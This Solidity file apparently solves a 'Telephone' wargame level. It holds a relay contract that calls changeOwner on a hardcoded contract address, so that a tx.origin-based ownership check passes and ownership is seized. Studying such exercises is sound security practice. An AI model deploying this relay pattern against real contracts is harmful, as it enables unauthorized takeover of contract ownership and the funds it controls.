// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

interface Telephone {
    function changeOwner(address _owner) external ;
}

contract Relay{
    Telephone private target=Telephone(0x271b5e1b3D5c6f78e6A724EC4ec533F847743Cd5);
    function Transform(address _owner) public{
        target.changeOwner(_owner);
    }
}
